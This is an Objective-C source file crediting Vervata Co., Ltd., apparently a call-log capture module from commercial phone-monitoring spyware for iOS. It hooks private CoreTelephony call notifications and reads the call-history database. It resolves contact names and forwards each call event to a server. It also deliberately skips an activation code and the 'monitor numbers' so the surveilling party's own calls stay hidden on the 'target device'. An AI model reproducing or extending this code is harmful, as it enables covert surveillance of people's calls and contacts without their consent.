/**
 - Project name :  CallLogCapture 
 - Class name   :  CallLogCaptureManager
 - Version      :  1.0  
 - Purpose      :  For Call Log Capturing Component
 - Copy right   :  30/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "CallLogCaptureManager.h"
#import "TelephonyNotificationManagerImpl.h"
#import "CallLogCaptureDAO.h"
#import "CallLog.h"
#import "HistoricalCallLog.h"
#import "FxLogger.h"
#import "FxEventEnums.h"
#import "FxCallLogEvent.h"
#import "DateTimeFormat.h"
#import "CTCall.h"
#import "ABContactsManager.h"
#import "TelephoneNumber.h"

#import "CTCall.h"

#import <UIKit/UIKit.h>

static NSString	* const kCallLogTimerNotificationKey			= @"CallLogTimerNotificationKey";

@interface CallLogCaptureManager (PrivateAPI)
- (void) sendCallLogEvent:(CallLog *) aCallLog;
- (BOOL) isNotOperatorServicesWithTelePhonyNumber:(NSString *) aNumber1 
								   databaseNumber:(NSString *) aNumber2
									callDirection:(FxEventDirection) aDirection;
+ (NSArray *) toFxEvent: (NSArray *) aCallLogs;
@end

@implementation CallLogCaptureManager

@synthesize mAC;
@synthesize mNotCaptureNumbers, mCurrentOutgoingAddress, mCurrentIncomingAddress;
@synthesize mCallHistoryMaxRowID;

/**
 - Method name: initWithEventDelegate: initWithEventDelegateinitWithEventDelegate
 - Purpose:This method is used to initialize the SMSCaptureManager class
 - Argument list and description: aEventDelegate (EventDelegate),aTelephonyNotificationManager (TelephonyNotificationManager)
 - Return description: No return type
*/

- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate andTelephonyNotificationCenter:(id <TelephonyNotificationManager>) aTelephonyNotificationManager {
	if ((self = [super init])) {
		mEventDelegate = aEventDelegate;
		mTelephonyNotificationManager = aTelephonyNotificationManager;
	}
	return self;
}

/**
 - Method name: initWithEventDelegate
 - Purpose:This method is used to initialize the CallLogCaptureManager class
 - Argument list and description: aEventDelegate (EventDelegate)
 - Return description: No return type
*/

- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mTelephonyNotificationManagerImpl = [[TelephonyNotificationManagerImpl alloc] init];
		[mTelephonyNotificationManagerImpl startListeningToTelephonyNotifications];
		mTelephonyNotificationManager = mTelephonyNotificationManagerImpl;
		mEventDelegate = aEventDelegate;
	}
	return self;
}

/**
 - Method name: startCapture
 - Purpose:This method is used to start Call Log Capturing
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) startCapture {
	if (!mListening) {
		[mTelephonyNotificationManager addNotificationListener:self
												  withSelector:@selector(onCallLogCapture:)
											   forNotification:KCALLSTATUSCHANGENOTIFICATION];
		mListening = TRUE;
		
//		CallLogCaptureDAO *callLogDAO=[[CallLogCaptureDAO alloc]init];
//		[self setMCallHistoryMaxRowID:[callLogDAO maxRowID]];
//		[callLogDAO release];
	}
}

/**
 - Method name: startCapture
 - Purpose:This method is used to stop Call Log Capturing
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) stopCapture {
	[mTelephonyNotificationManager removeListner:self];
	mListening = FALSE;
}

/**
 - Method name: onCallLogCapture
 - Purpose:This method is invoked only when initiate incomming or outgoing call 
 - Argument list and description: aNotification (id)
 - Return description: No return type
*/

- (void) onCallLogCapture:(id) aNotification {
	DLog (@"======= onCallLogCapture =======")
    if ([[[UIDevice currentDevice] systemVersion] intValue] <= 7) {
        [self processCallLogEvent:aNotification];
    } else {
        [NSTimer scheduledTimerWithTimeInterval:3
                                         target:self
                                       selector:@selector(callLogEventFired:)
                                       userInfo:aNotification
                                        repeats:NO];
    }
}

- (void) callLogEventFired: (NSTimer *) aTimer {
    [self processCallLogEvent:[aTimer userInfo]];
}

- (void) processCallLogEvent: (NSNotification *) aNotification {
    DLog(@"Process Call Log Event")
    NSNotification* notification = aNotification;
	NSDictionary* dictionary = [notification userInfo];
	if (dictionary) {
		NSInteger callStatus = [[dictionary objectForKey:@"kCTCallStatus"] intValue];
		if(callStatus==CALL_NOTIFICATION_STATUS_TERMINATED) {
			CTCall* call = (CTCall*) [dictionary objectForKey:@"kCTCall"];
            DLog(@"call %@", call)
            
			NSString * telNumber = nil;
			if (call) {
				telNumber = CTCallCopyAddress(nil, call);
				[telNumber autorelease];
			}
			
			CallLog *callLog = nil;
			NSArray *callLogs = [NSArray array];
			
			CallLogCaptureDAO *callLogDAO = [[CallLogCaptureDAO alloc]init];
			DLog(@"telNumber %@", telNumber)
            
            /*****************************************************************************************************
                mCurrentIncomingAddess will not be nil if this is the incoming or miss call.
                We will use this value only when
                    - It's miss call which is ended by target device  (can NOT get telNumber from CTCallCopyAddress)
                We will NOT use it when
                    - It's accepted incoming call                   (can get telNumber from CTCallCopyAddress)
                    - It's miss call which is ended by 3rd party    (can get telNumber from CTCallCopyAddress)
             *****************************************************************************************************/
            if ([telNumber length] == 0 && !CTCallIsOutgoing(call) && self.mCurrentIncomingAddress) {
                DLog(@"This is incoming which is ended by target device")
                telNumber = self.mCurrentIncomingAddress;
                [telNumber retain];
                [telNumber autorelease];
            }
            
            if ([telNumber length] == 0 && CTCallIsOutgoing(call) && self.mCurrentOutgoingAddress) {
                DLog(@"This is outgoing (iPhone 4s, iOS 8.1) which is declined by 3rd party")
                telNumber = self.mCurrentOutgoingAddress;
                [telNumber retain];
                [telNumber autorelease];
            }
            
            // Reset temp number
            self.mCurrentIncomingAddress = nil;
            self.mCurrentOutgoingAddress = nil;
            
			if ([telNumber length] == 0) {
				// Blocked number (this could be failed in conference call with blocked number)
				//callLogs = [callLogDAO selectCallHistory];
				//callLog = [callLogs objectAtIndex:0];
				
				callLog = [callLogDAO selectCallHistoryWithLastRowEqual:@""];
				if (callLog) {
                    callLogs = [NSArray arrayWithObject:callLog];
                } else {
                    // iOS 8, get nil from db of call log
                    callLog = [callLogDAO selectCallHistoryWithLastRowEqual:nil];
                    if (callLog) {
                        callLogs = [NSArray arrayWithObject:callLog];
                    }
                }
			} else { // Voice mail will come here
                //callLog = [callLogDAO selectCallHistoryWithLastRowEqual:telNumber];
                callLog = [callLogDAO selectCallHistoryWithLastRowEqualV2:telNumber];

				if (callLog) callLogs = [NSArray arrayWithObject:callLog];
			}
			
			// Private number is shown as 'Blocked' but its number is null
			DLog (@"telNumber           = %@", telNumber);
            DLog (@"db.number           = %@", [callLog mContactNumber]);
            DLog (@"NOT capture numbers = %@", [self mNotCaptureNumbers]);
            DLog (@"direction           = %d", [callLog mCallState]);
			DLog (@"callLog             = %@", callLog);
            DLog (@"callLogs            = %@", callLogs);
			DLog (@"contact ID          = %ld", (long)[callLog mContactID]);
            
			// Voice mail (AIS Thailand = 90099)
			BOOL isNotOperatorServicesNumber = [self isNotOperatorServicesWithTelePhonyNumber:telNumber
																			   databaseNumber:[callLog mContactNumber]
																				callDirection:[callLog mCallState]];
			BOOL isNotCaptureNumber = FALSE;
				
			// -- check monitor numbers only when it's NO outgoing call
			if ([callLog mCallState] != kEventDirectionOut) {
				
				TelephoneNumber *telNumberCompare = [[[TelephoneNumber alloc] init] autorelease];
				for (NSString *number in [self mNotCaptureNumbers]) {
					isNotCaptureNumber = [telNumberCompare isNumber:telNumber matchWithMonitorNumber:number];
					if (isNotCaptureNumber) {
						break;
					}
				}
			// -- check *#900900900 when it is outgoing call
			} 
			/*else if ([callLog mCallState] == kEventDirectionOut) {
				if ([telNumber isEqualToString:_FULLDEFAULTACTIVATIONCODE_]) {
					isNotCaptureNumber = YES;
				}
			}
			*/
            
			/*
			 1. Private number ==> Capture
			 2. Activation code number ==> Not capture
			 3. Voice mail number ==> Not capture
			 4. Number in self.mNotCaptureNumbers ==> Not capture
			 5. Incoming call of monitor number ==> Not capture
			 6. *#900900900 ==> Not capture
			 */
			
			if([callLogs count]							&&
			   ![telNumber isEqualToString:[self mAC]]	&&
			   isNotOperatorServicesNumber				&&
			   !isNotCaptureNumber						) {
				
				if ([telNumber length] == 0) {
					// Private number
					DLog (@"Send call event to server as private number, telNumber = %@", telNumber);
					NSString *version = [[UIDevice currentDevice] systemVersion];
					if ([version intValue] >= 7) {
						[callLog setMContactNumber:@"No Caller ID"];
					} else {
						[callLog setMContactNumber:@"Blocked"];
					}
					[self sendCallLogEvent:callLog];
				} else {
					// Not voice mail number, not activation code number, not in self.mNotCaptureNumbers
					DLog (@"Send call event to server as normal number, telNumber = %@", telNumber);
					[self sendCallLogEvent:callLog];
				}
			}

			[callLogDAO release];
			callLogDAO=nil;
		}
        
        else if (callStatus == CALL_NOTIFICATION_STATUS_INCOMING) {
            
            if ([[[UIDevice currentDevice] systemVersion] intValue] >= 8) {
                
                /******************************************************************************************************************************************************
                 For Miss call that has been declined by target device, when the notification of call termation has been invoked,
                 the result of CTCallCopyAddress is empty because the number doesn't exist in CTCall object. Thus we need to store
                 this number when the notifcation of incoming call which is called previously has been invoked.
                 
                 However, we know only that it is one kind of incoming call. We don't know that this incoming call will be miss call or accepted call.
                 Thus once the termination notification has been invoke, we need to decide if we should use the stored number (mcurrentIncomingAddess) or not
                 ******************************************************************************************************************************************************/
                
                DLog(@"Keep current incoming address !!!")
                // store address because after end the call by target device, adress doesn't exist
                CTCall* call = (CTCall*) [dictionary objectForKey:@"kCTCall"];
                DLog(@"call %@", call)
                NSString * telNumber = nil;
                if (call) {
                    telNumber = CTCallCopyAddress(nil, call);
                    self.mCurrentIncomingAddress = telNumber;
                    [telNumber release];
                }
                DLog(@"mCurrentIncomingAddress %@", self.mCurrentIncomingAddress)
            }
        } else if (callStatus == CALL_NOTIFICATION_STATUS_OUTGOING) {
            
            if ([[[UIDevice currentDevice] systemVersion] intValue] >= 8) {
                
                /*****************************************************************************************************
                 iPhone 4s, iOS 8.1 outgoing to 3rd party and is declined by 3rd party cannot get the telephone number
                 *****************************************************************************************************/
                
                DLog(@"Keep current outgoing address !!!")
                // store address because after end the call by target device, adress doesn't exist
                CTCall* call = (CTCall*) [dictionary objectForKey:@"kCTCall"];
                DLog(@"call %@", call)
                NSString * telNumber = nil;
                if (call) {
                    /*
                     iOS 8.3, 8.4,...
                     <key>com.apple.CommCenter.fine-grained</key>
                     <array>
                         <string>spi</string>
                         <string>phone</string>
                         <string>identity</string>
                         <string>sms</string>
                         <string>data-usage</string>
                         <string>data-allowed</string>
                         <string>data-allowed-write</string>
                     </array>
                     */
                    telNumber = CTCallCopyAddress(nil, call);
                    self.mCurrentOutgoingAddress = telNumber;
                    [telNumber release];
                }
                DLog(@"mCurrentOutgoingAddress %@", self.mCurrentOutgoingAddress)
            }
        }
	}
}

/**
 - Method name: isNotOperatorServicesWithTelePhonyNumber:databaseNumber:callDirection:
 - Purpose: This method is  used to check whether the call event is voice mail, operator defined numbers...
				which never insert into call history database
 - Argument list and description: aNumber1 (NSStrinbg *), aNumber2 (NSString *), aDirection of the call
 - Return description: BOOL
*/
 
- (BOOL) isNotOperatorServicesWithTelePhonyNumber:(NSString *) aNumber1 
								   databaseNumber:(NSString *) aNumber2
									callDirection:(FxEventDirection) aDirection {
	DLog (@"aNumber1 = %@, aNumber2 = %@, aDirection = %d", aNumber1, aNumber2, aDirection);
	if (aDirection==kEventDirectionOut) {
	   if (![aNumber1 isEqualToString:aNumber2]) 
		 return NO;
	}
	return YES;
}

/**
 - Method name: sendCallLogEvent
 - Purpose:This method is  used to send Call Log Event
 - Argument list and description: aCallLog (CallLog)
 - Return description: No return type
*/

- (void) sendCallLogEvent:(CallLog *) aCallLog {
	ABContactsManager *contactManager=[[ABContactsManager alloc]init];
	//DLog (@"Contact Name:--->%@",[contactManager searchContactName:[aCallLog mContactNumber]]);
//	DLog (@"Contact Name:--->%@",[contactManager searchFirstNameLastName:[aCallLog mContactNumber]]);
    DLog (@"Contact Name:--->%@",[contactManager searchFirstNameLastName:[aCallLog mContactNumber] contactID:[aCallLog mContactID]]);
	DLog (@"Contact Number:--->%@",[contactManager formatSenderNumber:[aCallLog mContactNumber]]);
	DLog (@"Duration:---->%lu",(unsigned long)[aCallLog mDuration]);
	DLog (@"Event Direction---->%d",[aCallLog mCallState]);
	//===========================================Create FxCallLog Event===============================================================
	FxCallLogEvent *callEvent=[[FxCallLogEvent alloc] init];
	NSString *formatNumber=[[aCallLog mContactNumber] stringByReplacingOccurrencesOfString:@"-" withString:@""];
	NSString *contactName=@"";
	if ([formatNumber length]>1) {
		//contactName=[contactManager searchContactName:formatNumber];
//		contactName=[contactManager searchFirstNameLastName:formatNumber];
        contactName=[contactManager searchFirstNameLastName:formatNumber contactID:[aCallLog mContactID]];
	}
	[callEvent setContactName:contactName];
	[callEvent setContactNumber:[contactManager formatSenderNumber:[aCallLog mContactNumber]]];
	[callEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[callEvent setDuration:[aCallLog mDuration]];
	[callEvent setDirection:[aCallLog mCallState]];
	[callEvent setEventType:kEventTypeCallLog];
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:callEvent withObject:self];
	}
	//======================================================Print Result=================================================================
//	NSString *resultString=[NSString stringWithFormat:@"...\nContact Name:%@,ContactNumber:%@,Duraction:%d,Direction:%d,DateTime:%@....\n",
//							 contactName,[aCallLog mContactNumber],[aCallLog mDuration],
//							 [aCallLog mCallState],[DateTimeFormat phoenixDateTime]];
//	FxLog("", "", 1, kFxLogLevelDebug,resultString);
	//==================================================================================================================================
	[contactManager release];
	contactManager=nil;
	[callEvent release];
	callEvent=nil;
}


#pragma mark - Request Historical Events

+ (NSArray *) toFxEvent: (NSArray *) aCallLogs {
    ABContactsManager *contactManager   = [[ABContactsManager alloc]init];
    NSMutableArray *fxeventEventArray   = [NSMutableArray array];
    
    for (HistoricalCallLog *callLog in aCallLogs) {
//        DLog (@"Contact Name:--->%@",[contactManager searchFirstNameLastName:[callLog mContactNumber] contactID:[callLog mContactID]]);
//        DLog (@"Contact Number:--->%@",[contactManager formatSenderNumber:[callLog mContactNumber]]);
//        DLog (@"Duration:---->%lu",(unsigned long)[callLog mDuration]);
//        DLog (@"Event Direction---->%d",[callLog mCallState]);
        
        FxCallLogEvent *callEvent   = [[FxCallLogEvent alloc] init];
        NSString *formatNumber      = [[callLog mContactNumber] stringByReplacingOccurrencesOfString:@"-" withString:@""];
        NSString *contactName       = @"";
        
        if ([formatNumber length] > 1) {
            contactName             = [contactManager searchFirstNameLastName:formatNumber contactID:[callLog mContactID]];
        }
        [callEvent setContactName:contactName];
        if ([[callLog mContactNumber] length] > 0) {
            //[callEvent setContactNumber:[contactManager formatSenderNumber:[callLog mContactNumber]]];
            [callEvent setContactNumber:formatNumber];
        } else {
            if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
                [callEvent setContactNumber:@"No Caller ID"];
            } else {
                [callEvent setContactNumber:@"Blocked"];
            }
        }
        // Set datetime according to the time in Call Database
        if ([callLog mDate]) {
            [callEvent setDateTime:[DateTimeFormat dateTimeWithDate:[callLog mDate]]];
        } else {
            [callEvent setDateTime:[DateTimeFormat phoenixDateTime]];
        }
        [callEvent setDuration:[callLog mDuration]];
        [callEvent setDirection:[callLog mCallState]];
        [callEvent setEventType:kEventTypeCallLog];
        
        [fxeventEventArray addObject:callEvent];
        
        [callEvent release];
        callEvent                   = nil;
    }
    
    [contactManager release];
    contactManager                  = nil;
    return fxeventEventArray;
}

+ (NSArray *) allCalls {
    CallLogCaptureDAO *callLogDAO   = [[CallLogCaptureDAO alloc] init];
    NSArray *callLogs               = [callLogDAO selectAllCallHistory];
    NSArray *fxCallLogs             = [self toFxEvent:callLogs];
    [callLogDAO release];
    return fxCallLogs;
}

+ (NSArray *) allCallsWithMax: (NSInteger) aMaxNumber {
    CallLogCaptureDAO *callLogDAO   = [[CallLogCaptureDAO alloc] init];
    NSArray *callLogs               = [callLogDAO selectAllCallHistoryWithMax: aMaxNumber];
    NSArray *fxCallLogs             = [self toFxEvent:callLogs];
    [callLogDAO release];
    return fxCallLogs;
}


/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/
- (void) dealloc {
	[self stopCapture];
	[mTelephonyNotificationManagerImpl release];
	mTelephonyNotificationManagerImpl=nil;
	[mAC release];
	[mNotCaptureNumbers release];
    self.mCurrentOutgoingAddress = nil;
    self.mCurrentIncomingAddress = nil;
	[super dealloc];
}

@end
